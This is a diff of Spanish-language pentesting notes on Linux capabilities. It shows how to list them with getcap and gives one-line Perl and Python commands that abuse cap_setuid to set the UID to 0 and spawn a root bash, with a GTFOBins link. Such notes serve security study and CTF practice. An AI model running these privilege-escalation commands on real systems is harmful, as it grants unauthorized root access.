@@ -37,22 +37,30 @@ Cuando un archivo binario tiene el bit de ejecución elevado establecido, se pue
 Es importante señalar que los permisos permitidos pueden ser limitados aún más mediante el uso de un mecanismo de control de acceso obligatorio (MAC, Mandatory Access Control), como **SELinux** o **AppArmor**, que restringen las acciones que los procesos pueden realizar en función de la política de seguridad del sistema.
 
 
-## Capabilities 
+# Capabilities 
+
+* [Gtfobins](https://gtfobins.github.io/#+capabilities)
 
 ```bash
 ❯ which getcap                             # Para ver si esta instalado el Getcap y mirar las capabilities
 ❯ which setcap                             # Para setear las capabilities
 
 ❯ getcap -r / 2>/dev/null                  # Listamos las capabilities que existan desde la raiz de forma recursiva y buscamos el comando aqui GTFOBins [GTFOBins]
-
-Tipos de capabilities:
-	# /usr/bin/perl cap_setuid+ep = Esta capabilitie nos permite gestionar el UID y hacer que opere como root
-	# /usr/bin/python3.10  cap_setuid+ep = Esta capabilitie nos permite gestionar el UID y hacer que opere como root
 ```
 
-* [Gtfobins](https://gtfobins.github.io/#+capabilities)
+## Perl 
+```bash 
+Esta capabilitie nos permite gestionar el UID y hacer que opere como root
+	# /usr/bin/perl cap_setuid+ep 
 
-* Ejemplo con la capability de Python
-```python 
-❯ python3.10 -c 'import os; os.setuid(0); os.system("bash")'          # Podemos controlar el identificador de usauario, y asi colocar el 0 para lanzar una bash como root
+❯ /usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
+# Controlar el identificador del usuario y colocar el setuid=0 para obtener una bash como root
+```
+
+## Python
+```bash  
+Esta capabilitie nos permite gestionar el UID y hacer que opere como root
+	# /usr/bin/python3.10  cap_setuid+ep 
+
+❯ /usr/bin/python3.10 -c 'import os; os.setuid(0); os.system("bash")'          # Controlar el identificador del usuario y colocar el setuid=0 para obtener una bash como root
 ```
